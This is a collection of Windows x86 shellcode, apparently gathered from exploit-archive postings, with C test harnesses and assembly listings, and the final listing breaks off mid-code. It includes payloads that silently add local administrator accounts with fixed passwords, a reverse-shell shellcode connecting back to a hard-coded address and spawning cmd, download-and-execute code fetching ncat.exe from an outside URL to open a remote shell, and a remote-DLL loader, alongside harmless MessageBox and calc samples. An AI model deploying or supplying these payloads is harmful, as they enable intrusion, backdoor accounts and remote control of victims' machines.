# Title      : win32/PerfectXp-pc1/sp3 (Tr) Add Admin Shellcode 112 bytes
# Author     : KaHPeSeSe
# Screenshot : http://i53.tinypic.com/289yamq.jpg 
# Desc.      : usr: kpss , pass: 12345 , localgroup: Administrator
# Tested on  : PERFECT XP PC1 / SP3
# Date       : 18/07/2011
# Not        : a.q kpss :((
  
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
   
int main(){
      
    unsigned char shellcode[]=
    "\xeb\x1b\x5b\x31\xc0\x50\x31\xc0\x88\x43\x4e\x53\xbb\x0d\x25\x86\x7c"
    "\xff\xd3\x31\xc0\x50\xbb\x12\xcb\x81\x7c\xff\xd3\xe8\xe0\xff\xff\xff"
    "\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x6e\x65\x74\x20\x75\x73"
    "\x65\x72\x20\x6b\x70\x73\x73\x20\x31\x32\x33\x34\x35\x20\x2f\x61\x64"
    "\x64\x20\x26\x26\x20\x6e\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67\x72\x6f"
    "\x75\x70\x20\x41\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\x74\x6f\x72\x73"
    "\x20\x2f\x61\x64\x64\x20\x6b\x70\x73\x73";
   
    printf("Size = %d bytes\n", strlen(shellcode));
   
    ((void (*)())shellcode)();
      
      
   
    return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

 PEB Kernel32.dll ImageBase Finder ( Ascii Printable )

 Author: Koshi

 Description: Uses PEB method to locate the ImageBase of Kernel32.dll
              ONLY supports NT/2K/XP.. sorry no 9X. ImageBase will be
	      returned in EAX. No null bytes, obviously, so no need to
	      encode really.

 Length: 49 Bytes
 Registers Used: eax,esi
 Compiled: j0X40PPPd3@0^V4L4@^V30VX^4P4L30XPVX^30VX^4X4P30VX

*/

/*

00401000 > $ 6A 30          PUSH 30
00401002   . 58             POP EAX
00401003   . 34 30          XOR AL,30
00401005   . 50             PUSH EAX
00401006   . 50             PUSH EAX
00401007   . 50             PUSH EAX
00401008   . 64:3340 30     XOR EAX,DWORD PTR FS:[EAX+30]
0040100C   . 5E             POP ESI
0040100D   . 56             PUSH ESI
0040100E   . 34 4C          XOR AL,4C
00401010   . 34 40          XOR AL,40
00401012   . 5E             POP ESI
00401013   . 56             PUSH ESI
00401014   . 3330           XOR ESI,DWORD PTR DS:[EAX]
00401016   . 56             PUSH ESI
00401017   . 58             POP EAX
00401018   . 5E             POP ESI
00401019   . 34 50          XOR AL,50
0040101B   . 34 4C          XOR AL,4C
0040101D   . 3330           XOR ESI,DWORD PTR DS:[EAX]
0040101F   . 58             POP EAX
00401020   . 50             PUSH EAX
00401021   . 56             PUSH ESI
00401022   . 58             POP EAX
00401023   . 5E             POP ESI
00401024   . 3330           XOR ESI,DWORD PTR DS:[EAX]
00401026   . 56             PUSH ESI
00401027   . 58             POP EAX
00401028   . 5E             POP ESI
00401029   . 34 58          XOR AL,58
0040102B   . 34 50          XOR AL,50
0040102D   . 3330           XOR ESI,DWORD PTR DS:[EAX]
0040102F   . 56             PUSH ESI
00401030   . 58             POP EAX

*/

unsigned char Shellcode[] =
{"\x6A\x30\x58\x34\x30\x50\x50\x50"
"\x64\x33\x40\x30\x5E\x56\x34\x4C"
"\x34\x40\x5E\x56\x33\x30\x56\x58"
"\x5E\x34\x50\x34\x4C\x33\x30\x58"
"\x50\x56\x58\x5E\x33\x30\x56\x58"
"\x5E\x34\x58\x34\x50\x33\x30\x56"
"\x58"};

int main( int argc, char *argv[] )
{
 printf( "Shellcode is %u bytes.\n", sizeof(Shellcode)-1 );
 printf( Shellcode, sizeof(Shellcode) );
 return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

 PEB Kernel32.dll ImageBase Finder ( Alphanumeric )
 Author: Koshi
 Description: Uses PEB method to locate the ImageBase of Kernel32.dll
              ONLY supports NT/2K/XP.. sorry no 9X. ImageBase will be
    	      returned in EAX. No null bytes, obviously, so no need to
	      encode really.
 Length: 67 Bytes
 Registers Used: ecx,eax,esi
 Compiled: j0X40PVTY631d3F04m4a30VXVTY631V4P4L30XPVXVTY631V30VXVTY631V4X4P30VX

*/

/*

00401000 > $ 6A 30          PUSH 30
00401002   . 58             POP EAX
00401003   . 34 30          XOR AL,30
00401005   . 50             PUSH EAX
00401006   . 56             PUSH ESI
00401007   . 54             PUSH ESP
00401008   . 59             POP ECX
00401009   . 36:3331        XOR ESI,DWORD PTR SS:[ECX]
0040100C   . 64:3346 30     XOR EAX,DWORD PTR FS:[ESI+30]
00401010   . 34 6D          XOR AL,6D
00401012   . 34 61          XOR AL,61
00401014   . 3330           XOR ESI,DWORD PTR DS:[EAX]
00401016   . 56             PUSH ESI
00401017   . 58             POP EAX
00401018   . 56             PUSH ESI
00401019   . 54             PUSH ESP
0040101A   . 59             POP ECX
0040101B   . 36:3331        XOR ESI,DWORD PTR SS:[ECX]
0040101E   . 56             PUSH ESI
0040101F   . 34 50          XOR AL,50
00401021   . 34 4C          XOR AL,4C
00401023   . 3330           XOR ESI,DWORD PTR DS:[EAX]
00401025   . 58             POP EAX
00401026   . 50             PUSH EAX
00401027   . 56             PUSH ESI
00401028   . 58             POP EAX
00401029   . 56             PUSH ESI
0040102A   . 54             PUSH ESP
0040102B   . 59             POP ECX
0040102C   . 36:3331        XOR ESI,DWORD PTR SS:[ECX]
0040102F   . 56             PUSH ESI
00401030   . 3330           XOR ESI,DWORD PTR DS:[EAX]
00401032   . 56             PUSH ESI
00401033   . 58             POP EAX
00401034   . 56             PUSH ESI
00401035   . 54             PUSH ESP
00401036   . 59             POP ECX
00401037   . 36:3331        XOR ESI,DWORD PTR SS:[ECX]
0040103A   . 56             PUSH ESI
0040103B   . 34 58          XOR AL,58
0040103D   . 34 50          XOR AL,50
0040103F   . 3330           XOR ESI,DWORD PTR DS:[EAX]
00401041   . 56             PUSH ESI
00401042   . 58             POP EAX


*/

unsigned char Shellcode[] =
{"\x6A\x30\x58\x34\x30\x50\x56\x54"
"\x59\x36\x33\x31\x64\x33\x46\x30"
"\x34\x6D\x34\x61\x33\x30\x56\x58"
"\x56\x54\x59\x36\x33\x31\x56\x34"
"\x50\x34\x4C\x33\x30\x58\x50\x56"
"\x58\x56\x54\x59\x36\x33\x31\x56"
"\x33\x30\x56\x58\x56\x54\x59\x36"
"\x33\x31\x56\x34\x58\x34\x50\x33"
"\x30\x56\x58"};



int main( int argc, char *argv[] )
{
 printf( "Shellcode is %u bytes.\n", sizeof(Shellcode)-1 );
 printf( Shellcode, sizeof(Shellcode) );
 return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

 PEB!NtGlobalFlags ( 14 BYTES )
 Author: Koshi
 Description: Uses PEB method to determine whether a debugger is
	      attached to the running proccess or not. No 9x. :(
 Length: 14 Bytes
 Registers Used: EAX,ESI,ESP
 Compiled: jpXV34dd3v09Fh

*/

/*

 00401000 >   6A 70          PUSH 70
 00401002     58             POP EAX
 00401003     56             PUSH ESI
 00401004     333464         XOR ESI,DWORD PTR SS:[ESP]
 00401007     64:3376 30     XOR ESI,DWORD PTR FS:[ESI+30]
 0040100B     3946 68        CMP DWORD PTR DS:[ESI+68],EAX
			     JE DebuggerPresent ( If equal debugger attached )
*/

unsigned char Shellcode[] =
{"\x6A\x70\x58\x56\x33\x34\x64"
"\x64\x33\x76\x30\x39\x46\x68"};



int main( int argc, char *argv[] )
{
 printf( "Shellcode is %u bytes.\n", sizeof(Shellcode)-1 );
 printf( Shellcode, sizeof(Shellcode) );
 return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


68 9D 61 F9 77  push 0x77C01345
B8 C7 93 C1 77  mov eax,msvcrt.system
FF D0           call eax
  
In msvcrt.dll at 0x77C01344 We have string ".cmd", that's the trick.
Code will work in WinXP SP3 Pro Rus, in other versions you'd better search
the string and system(char*) address for yourself.
  
Coded via lord Kelvin.



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

We use the PEB for the Output/Input/Error Handles.

typedef struct PEB
BOOLEAN InheritedAddressSpace ;
BOOLEAN ReadImageFileExecOptions ;
BOOLEAN BeingDebugged ;
BOOLEAN Spare ;
HANDLE Mutant ;
PVOID ImageBaseAddress ;
PPEB LDR DATA LoaderData ;
PRTL USER PROCESS PARAMETERS ProcessParameters ;
...
typedef struct RTL USER PROCESS PARAMETERS
ULONG MaximumLength ;
ULONG Length ;
ULONG Flags ;
ULONG DebugFlags ;
PVOID ConsoleHandle ;
ULONG ConsoleFlags ;
HANDLE StdInputHandle ; +18h
HANDLE StdOutputHandle ; +1Ch
HANDLE StdErrorHandle ; +20h
...

So with the nooil tricks we have now :
mov eax,dword ptr fs :[18h]
mov eax,dword ptr ds :[eax+30h]
mov eax,dword ptr ds :[eax+10h]
mov ecx, hClientSocket
mov dword ptr ds :[eax+18h],ecx ; SetStdHandle(STD INPUT HANDLE,hClientSocket) ;
mov dword ptr ds :[eax+1Ch],ecx ; SetStdHandle(STD OUTPUT HANDLE,hClientSocket) ;
mov dword ptr ds :[eax+20h],ecx ; SetStdHandle(STD ERROR HANDLE,hClientSocket) ;

249 bytes Reverse Generic Shellcode without loader(no null byte) :

comment *
-----------------------------------------------------------------
---- New generation shellcode using my "nooil tricks" methods ---
----    (c) 2005 - Matthieu Suiche / msuiche@gmail.com        ---
249 bytes Reverse Generic Shellcode without loader(no null byte)
-----------------------------------------------------------------
hehe hi metasploit's guys ;)
*
.386
.model flat, stdcall

assume fs:nothing

LoadLibraryA    equ 0D6C3D898h
WSAStartupA     equ 0C7B3B4CBh
WSASocketA      equ 0B8ACB6C6h
connect                 equ 06EE2D2C8h
system                  equ 0E873E6D8h
ExitProcessA    equ 0D7D8EA95h
; ------------------------------
sin_addr                equ 0B01A8C0h ; 192.168.1.11
sin_port                equ 3713h       ; 4919
; ------------------------------
str_cmd                 equ 0FF646D63h

; ----------------------------------------------------
_nooil_ segment public ; writable section
;.
; ----- CODE -----
scode:
       jmp short _eip
       GetEip:
       pop             edi
       jmp short EntryPoint
_eip:
       call    GetEip
Kernel32BaseAddr:
       pushad
       test    eax, eax
       jnz             MyGetProcAddr
       ; eax = 0
       mov     eax, dword ptr fs:[eax+30h]
       mov     eax, dword ptr ds:[eax+0ch]
       mov     esi, dword ptr ds:[eax+1ch]
       lodsd
       mov     eax, dword ptr ds:[eax+08h]
MyGetProcAddr:
       mov             edx, eax

; - PE
       add             edx, dword ptr ds:[edx+3ch]

; - Export Table
       mov             edx, dword ptr ds:[edx+78h]
       add             edx, eax

       mov     ebx, dword ptr ds:[edx+20h]
       add             ebx, eax

       xor             ecx, ecx
       mov             ebp, eax

FindAddr:
       inc             ecx
       mov     edi, dword ptr ds:[ebx+ecx*4]
       add             edi, eax

       mov             esi, dword ptr [edi]
       add             esi, dword ptr [edi+4]
       cmp             esi, [esp+36]
       jz              AddrFound
       jmp             short FindAddr

AddrFound:

       mov     ebx, dword ptr ds:[edx+24h]
       add     ebx, ebp
       mov     cx,word ptr ds:[ebx+ecx*2]

       mov     ebx, dword ptr ds:[edx+1Ch]
       add     ebx, ebp
       add     ebp, dword ptr ds:[ebx+ecx*4]

       mov             dword ptr [esp+28], ebp
       popad
       retn

EntryPoint:
       xor             eax, eax
       xor             ecx, ecx
       push    LoadLibraryA
       call    edi                                                     ; MyGetProcAddr(LoadLibraryA);
       mov             ebp, eax

       push    cx
       push    word ptr '23'
       push    '_2sw'
       push    esp
       call    eax             ; LoadLibraryA("ws2_32");

       mov             ebx, eax

       push    WSAStartupA
       call    edi             ; MyGetProcAddr(WSAStartupA)


       mov             esi, esp
       add             si, -301h
       push    esi
       push    2
       call    eax             ; WSAStartup(2,&WSAstruct);

       mov             eax, ebx

       push    WSASocketA
       call    edi             ; MyGetProcAddr(WSASocketA);

       xor             esi, esi
       push    esi
       push    esi
       push    esi
       push    esi
       inc             esi
       push    esi
       inc             esi
       push    esi
       call    eax             ; WSASocket(2,1,0,0,0,0);

       xchg    ebx, eax ; ebx = sockfd , eax = ws2_32

       push    sin_addr
       push    word ptr sin_port
       push    si
       mov             esi, esp

       push    connect
       call    edi             ; MyGetProcAddr(connect)

       push    10h
       push    esi
       push    ebx
       call    eax             ; connect(sockfd, &struct, sizeof(struct));

       push    ax
       push    word ptr 'tr'
       push    'cvsm'
       push    esp
       call    ebp             ; LoadLibraryA("msvcrt");

       push    system
       call    edi             ; MyGetProcAddr(system);

       ; ----------------------------- nooil tricks ----------------------------------
       xor             ecx, ecx
       mov             ecx,dword ptr fs:[ecx+18h]
       mov             ecx,dword ptr ds:[ecx+30h]
       mov             ecx,dword ptr ds:[ecx+10h]
       mov             dword ptr ds:[ecx+18h],ebx ; SetStdHandle(STD_INPUT_HANDLE,hClient);
       mov     dword ptr ds:[ecx+1Ch],ebx ; SetStdHandle(STD_OUTPUT_HANDLE,hClient);
       mov     dword ptr ds:[ecx+20h],ebx ; SetStdHandle(STD_ERROR_HANDLE,hClient);
       ; -----------------------------------------------------------------------------


       push    str_cmd
       inc             byte ptr [esp+3]
       push    esp
       call    eax     ; system("cmd");

       ; Exit
       push    ExitProcessA
       call    edi             ; MyGetProcAddr(ExitProcessA)
       call    eax             ; ExitProcessA();
end scode
; ------ END CODE ------
;.
_nooil_ ends
; ----------------------------------------------------




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Author : Omega7
Assembly Code : Steve Hanna
Changed by : Omega7
Description : It is 110 Byte Shellcode which Pops up Message Box Under Windows Xp SP2
If you Want to use it in any other Windows You need to change the address
that i have marked!

*/

#include <stdlib.h>
#include <string.h>

char shellcode[]=
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x37\x59\x88\x51\x0a\xbb"
"\x77\x1d\x80\x7c"    //***LoadLibraryA(libraryname) IN WinXP sp2***
"\x51\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x0b\x51\x50\xbb"
"\x28\xac\x80\x7c"   //***GetProcAddress(hmodule,functionname) IN sp2***
"\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x06\x31\xd2\x52\x51"
"\x51\x52\xff\xd0\x31\xd2\x50\xb8\xa2\xca\x81\x7c\xff\xd0\xe8\xc4\xff"
"\xff\xff\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x4e\xe8\xc2\xff\xff"
"\xff\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x41\x4e\xe8\xc2\xff\xff"
"\xff\x4f\x6d\x65\x67\x61\x37\x4e";

/*MessageBox shellcode for Windoew xp sp2 */

int main ()
{
int *ret;
ret=(int *)&ret+2;
printf("Shellcode Length is : %d",strlen(shellcode));
(*ret)=(int)shellcode;
return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
win32/xp sp3 (FR) Sleep 14 bytes
Author : optix hacker <aidi youssef>
Mail : optix@9.cn
notice Tested Under Windows XP SP3 (fr)
this shellcode makes a sleep for 90000ms=90s=1,5min
this is API from kernel32.dll for sleep :0x7C802446 in win32 xp sp3 (fr)
assembly code is secret in this shellcode :)

*/
#include <stdio.h>
unsigned char shellcode[] ="\x31"

"\xC0\xB9\x46\x24\x80\x7C\x66\xB8\x90\x5F\x50\xFF\xD1";
int main ()
{
int *ret;
ret=(int *)&ret+2;
printf("Shellcode Length is : %d\n",strlen(shellcode));
(*ret)=(int)shellcode;
return 0;
} 



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

; Nice theorhetically generic url download and execute
; shellcode for Windows XP.
;
; Heck, atleast it saves you using tftp!
;
; Peter4020@hotmail.com
;
; nasmw -s -fbin -o download.s download.asm

bits 32

start:
jmp short avoidnastynulls

continue:
pop edi				; edi = 'urlmon.dll'
mov esi, edi
mov al, 0ffh
repne scasb
inc byte [edi-01h]		; edi = string of url
mov ebx, edi
mov al, 0ffh
repne scasb
inc byte [edi-01h]		; edi = path of download
mov edx, edi
repne scasb
inc byte [edi-01h]
push edx

push ebx
push edx
push esi

mov ebx, 0c25b5effh
mov ecx, 0deadc0deh
mov edi, 77e60101h

trawlmem:
inc edi
mov al, 0ffh
repne scasb
jmp short checkbytes
nop

checkbytes:
dec edi
push dword [edi]
pop esi
cmp ebx, esi
je short gotcha
jmp short trawlmem

jmp short pastpoint

avoidnastynulls:
jmp short data

pastpoint:

gotcha:
lea eax, [edi-2eh]		; get to start of loadlibrarya function
call eax			; call loadlibrarya

pop edx
pop ebx

push edx
xor ecx, ecx
push ecx
push ecx
push edx			; path of download
push ebx			; url of download
push ecx

mov ebx, 8d8d5602h
mov ecx, 0badc0dedh
mov edi, eax			; eax = base of urlmon.dll

trawlmem2:
inc edi
mov al, 002h
repne scasb
jmp short checkbytes2
nop

checkbytes2:
dec edi
push dword [edi]
pop esi
cmp ebx, esi
je short gotcha2
jmp short trawlmem2

gotcha2:
lea eax, [edi-1bh]		; get to start of urldownloadtofilea function
call eax			; call urldownloadtofilea

pop edx
xor ecx, ecx
;inc ecx
push ecx
push edx

mov ebx, 0c458b66h
mov ecx, 1337f00dh
mov edi, 77e60101h

trawlmem3:
inc edi
mov al, 066h
repne scasb
jmp short checkbytes3
nop

checkbytes3:
dec edi
push dword [edi]
pop esi
cmp ebx, esi
je short gotcha3
jmp short trawlmem3

gotcha3:
lea eax, [edi-16h]		; get to start of winexec function
call eax			; call winexec

mov ecx, 0deadc0deh
infloop:			; infinite loop; no crash when done
inc ecx
cmp ecx, 0badc0dedh
loopnz infloop			; if this slows you down too much, remove it!

int 3h

data:
call continue
db 'URLMON.DLL', 0ffh
db 'http://www.elitehaven.net/ncat.exe', 0ffh	; the file at this address spawns remote shell on port 9999
db 'c:\nc.exe', 0ffh




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Title: Allwin MessageBoxA Shellcode
Date: 2010-06-11
Author: RubberDuck
Web: http://bflow.security-portal.cz
Tested on: Win 2k, Win 2003, Win XP Home SP2/SP3 CZ/ENG (32), Win Vista (32)/(64), Win 7 (32)/(64), Win 2k8 (32)
Thanks to: kernelhunter, Lodus, Vrtule, Mato, cm3l1k1, eat, st1gd3r and others
*/
 
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
 
int main(){
    unsigned char shellcode[]=
    "\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B"
    "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9"
    "\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C"
    "\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0"
    "\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B"
    "\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72"
    "\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03"
    "\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47"
    "\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F"
    "\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72"
    "\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66"
    "\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14"
    "\x8E\x03\xD3\x52\x33\xFF\x57\x68\x61\x72"
    "\x79\x41\x68\x4C\x69\x62\x72\x68\x4C\x6F"
    "\x61\x64\x54\x53\xFF\xD2\x68\x33\x32\x01"
    "\x01\x66\x89\x7C\x24\x02\x68\x75\x73\x65"
    "\x72\x54\xFF\xD0\x68\x6F\x78\x41\x01\x8B"
    "\xDF\x88\x5C\x24\x03\x68\x61\x67\x65\x42"
    "\x68\x4D\x65\x73\x73\x54\x50\xFF\x54\x24"
    "\x2C\x57\x68\x4F\x5F\x6F\x21\x8B\xDC\x57"
    "\x53\x53\x57\xFF\xD0\x68\x65\x73\x73\x01"
    "\x8B\xDF\x88\x5C\x24\x03\x68\x50\x72\x6F"
    "\x63\x68\x45\x78\x69\x74\x54\xFF\x74\x24"
    "\x40\xFF\x54\x24\x40\x57\xFF\xD0";
 
    printf("Size = %d\n", strlen(shellcode));
 
    system("PAUSE");
 
    ((void (*)())shellcode)();
 
    return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Title: Allwin WinExec add new local administrator + ExitProcess Shellcode - 272 bytes
Date: 2011-05-25
Author: RubberDuck
Web: http://bflow.security-portal.cz
Tested on: Win 2k, Win 2003, Win XP Home SP2/SP3 CZ/ENG (32), Win Vista (32)/(64), Win 7 (32)/(64), Win 2k8 (32)
 -- command: cmd.exe /c net user RubberDuck mudbath /add && net localgroup administrators RubberDuck /add
 -- Username: RubberDuck
 -- Password: mudbath
*/
 
#include <stdio.h>
#include <windows.h>
 
int main(){
    unsigned char shellcode[]=
        "\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B"
        "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9"
        "\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C"
        "\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0"
        "\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B"
        "\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72"
        "\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03"
        "\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47"
        "\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F"
        "\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72"
        "\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66"
        "\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14"
        "\x8E\x03\xD3\x52\x68\x78\x65\x63\x01\xFE"
        "\x4C\x24\x03\x68\x57\x69\x6E\x45\x54\x53"
        "\xFF\xD2\x6A\x05\xEB\x23\xFF\xD0\x68\x65"
        "\x73\x73\x01\x8B\xDF\xFE\x4C\x24\x03\x68"
        "\x50\x72\x6F\x63\x68\x45\x78\x69\x74\x54"
        "\xFF\x74\x24\x1C\xFF\x54\x24\x1C\x57\xFF"
        "\xD0\xE8\xD8\xFF\xFF\xFF\x63\x6D\x64\x2E"
        "\x65\x78\x65\x20\x2F\x63\x20\x6E\x65\x74"
        "\x20\x75\x73\x65\x72\x20\x52\x75\x62\x62"
        "\x65\x72\x44\x75\x63\x6B\x20\x6D\x75\x64"
        "\x62\x61\x74\x68\x20\x2F\x61\x64\x64\x20"
        "\x26\x26\x20\x6E\x65\x74\x20\x6C\x6F\x63"
        "\x61\x6C\x67\x72\x6F\x75\x70\x20\x61\x64"
        "\x6D\x74\x6F\x72\x73\x20\x52\x75\x62\x62"
        "\x65\x72\x44\x75\x63\x6B\x20\x2F\x61\x64"
        "\x64\x00";
    LPVOID lpAlloc;
    void (*pfunc)();
 
    printf("size = %i bytes\n", lstrlen(shellcode) + 1);
    printf("-------------------------\nUsername: RubberDuck\nPassword: mudbath\n");
    system("PAUSE");
 
    lpAlloc = VirtualAlloc(0, 4096,
                           MEM_COMMIT,
                           PAGE_EXECUTE_READWRITE);
 
    if(lpAlloc == NULL){
        printf("Memory not allocated!\n");
        return 0;
    }
 
    memcpy(lpAlloc, shellcode, lstrlen(shellcode) + 1);
 
    pfunc = lpAlloc;
 
    pfunc();
 
    return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Author: SkuLL-HacKeR
Big Thx To :  my brothers : Pr0F.SELLiM - ThE X-HaCkEr -  Jiko  - My friends in Morocco
H0ME  : Geeksec.com  & No-exploiT
Email : My@Hotmail.iT & Wizard-skh@hotmail.com
 
 
// Win32 Shellcode Collection (calc) 19 bytes
// Shellcode Exec Calc.exe
// Tested on XP SP2 FR
#include "stdio.h"
unsigned char shellcode[] = "\xeB\x02\xBA\xC7\x93"
                            "\xBF\x77\xFF\xD2\xCC"
                            "\xE8\xF3\xFF\xFF\xFF"
                            "\x63\x61\x6C\x63";
int main ()
{
int *ret;
ret=(int *)&ret+2;
printf("Shellcode Length is : %d\n",strlen(shellcode));
(*ret)=(int)shellcode;
return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

; Copyright (c) 2009-2010, Berend-Jan "SkyLined" Wever <berendjanwever@gmail.com>
; Project homepage: http://code.google.com/p/w32-dl-loadlib-shellcode/
; All rights reserved. See COPYRIGHT.txt for details.
BITS 32
; Windows x86 null-free shellcode that writes "Hello, world!" to stdout.
; Works in any console application for Windows 5.0-7.0 all service packs.
; (See http://skypher.com/wiki/index.php/Hacking/Shellcode).
; This version uses 16-bit hashes.

%define url 'http://skypher.com/dll'
%strlen sizeof_url url

%include 'w32-dl-loadlib-shellcode-hash-list.asm'

%define B2W(b1,b2)                      (((b2) << 8) + (b1))
%define W2DW(w1,w2)                     (((w2) << 16) + (w1))
%define B2DW(b1,b2,b3,b4)               (((b4) << 24) + ((b3) << 16) + ((b2) << 8) + (b1))

%define buffer_size 0x7C

%ifdef STACK_ALIGN
    AND     SP, 0xFFFC
%endif
    MOV     EDI, W2DW(hash_kernel32_LoadLibraryA, hash_urlmon_URLDownloadToCacheFileA)
find_hash: ; Find ntdll's InInitOrder list of modules:
    PUSH    EDI                         ; Stack = (hash, hash) [, &(url), &(LoadLibraryA)]
    XOR     ESI, ESI                    ; ESI = 0
    MOV     ESI, [FS:ESI + 0x30]        ; ESI = &(PEB) ([FS:0x30])
    MOV     ESI, [ESI + 0x0C]           ; ESI = PEB->Ldr
    MOV     ESI, [ESI + 0x1C]           ; ESI = PEB->Ldr.InInitOrder (first module)
next_module: ; Get the baseaddress of the current module and find the next module:
    MOV     EBP, [ESI + 0x08]           ; EBP = InInitOrder[X].base_address
    MOV     ESI, [ESI]                  ; ESI = InInitOrder[X].flink == InInitOrder[X+1]
get_proc_address_loop: ; Find the PE header and export and names tables of the module:
    MOV     EBX, [EBP + 0x3C]           ; EBX = &(PE header)
    MOV     EBX, [EBP + EBX + 0x78]     ; EBX = offset(export table)
    ADD     EBX, EBP                    ; EBX = &(export table)
    MOV     ECX, [EBX + 0x18]           ; ECX = number of name pointers
    JCXZ    next_module                 ; No name pointers? Next module.
next_function_loop: ; Get the next function name for hashing:
    MOV     EDI, [EBX + 0x20]           ; EDI = offset(names table)
    ADD     EDI, EBP                    ; EDI = &(names table)
    MOV     EDI, [EDI + ECX * 4 - 4]    ; EDI = offset(function name)
    ADD     EDI, EBP                    ; EDI = &(function name)
    XOR     EAX, EAX                    ; EAX = 0
    CDQ                                 ; EDX = 0
hash_loop: ; Hash the function name and compare with requested hash
    XOR     DL, [EDI]
    ROR     DX, BYTE hash_ror_value
    SCASB
    JNE     hash_loop
    CMP     DX, [ESP]
    LOOPNE  next_function_loop          ; Not the right hash and functions left in module? Next function
    JNE     next_module                 ; Not the right hash and no functions left in module? Next module
    ; Found the right hash: get the address of the function:
    MOV     EDX, [EBX + 0x24]           ; ESI = offset ordinals table
    ADD     EDX, EBP                    ; ESI = &oridinals table
    MOVZX   EDX, WORD [EDX + 2 * ECX]   ; ESI = ordinal number of function
    MOV     EDI, [EBX + 0x1C]           ; EDI = offset address table
    ADD     EDI, EBP                    ; EDI = &address table
    ADD     EBP, [EDI + 4 * EDX]        ; EBP = &(function)
    ; Move to the next hash, this sets ECX to 0 if there are no more hashes:
    POP     CX                          ; CX = hash | Stack = hash [, &(url), &(LoadLibraryA)]
    POP     CX                          ; CX = hash | Stack = [&(url), &(LoadLibraryA)]
    MOV     AH, 0x1                     ; EAX = 0x100
    JCXZ    download_and_loadlibrary    ; No more hashes
    MOV     EDI, ECX                    ; EDI = hashes
    SUB     ESP, EAX                    ; Stack = buffer (0x100 bytes)
    PUSH    AX                          ; Stack = (0, 1), buffer
    PUSH    B2DW('l', 'm', 'o', 'n')    ; Stack = "lmon", (0, 1), buffer
    PUSH    WORD B2W('u', 'r')          ; Stack = "urlmon", (0, 1), buffer
    PUSH    ESP                         ; Stack = &("urlmon"), "urlmon", (0, 1), buffer
    CALL    EBP                         ; LoadLibraryA("urlmon")
    PUSH    EBP                         ; Stack = &(LoadLibraryA), buffer
    CALL    find_hash                   ; Stack = &(url), &(LoadLibraryA), buffer
    db      url
download_and_loadlibrary:               ; Stack = &(url), &(LoadLibraryA), buffer
    POP     ESI                         ; ESI = &(url)          | Stack = &(LoadLibraryA), buffer
    POP     EDX                         ; EDX = &(LoadLibraryA) | Stack = buffer
    ; Copy url to stack and NULL terminate it:
    MOV     EDI, ESP                    ; EDI = &(buffer)
    PUSH    BYTE sizeof_url             ; 
    POP     ECX                         ; ECX = sizeof(url)
    REP     MOVSB                       ; Stack = url buffer     | EDI = &(buffer)
    STOSB                               ; Stack = url, 0, buffer | EDI = &(buffer)
    MOV     ESI, ESP                    ; ESI = &(url)
    ; Create a ret-into-libc stack chain to make URLDownloadToCacheFileA() return to LoadLibraryA():
                                        ; LoadLibraryA(
    PUSH    EDI                         ;   __in LPCTSTR lpFileName = &(buffer)
    PUSH    ECX                         ; ) return address = NULL
                                        ; URLDownloadToCacheFileA(
    PUSH    ECX                         ;   __in  IBindStatusCallback *pBSC = NULL
    PUSH    ECX                         ;         DWORD dwReserved = NULL
    ; Our buffer is not really 0x100 bytes long anymore because we used part of it to store the URL... oh well.
    PUSH    EAX                         ;   __in  DWORD cchFileName = sizeof(buffer)
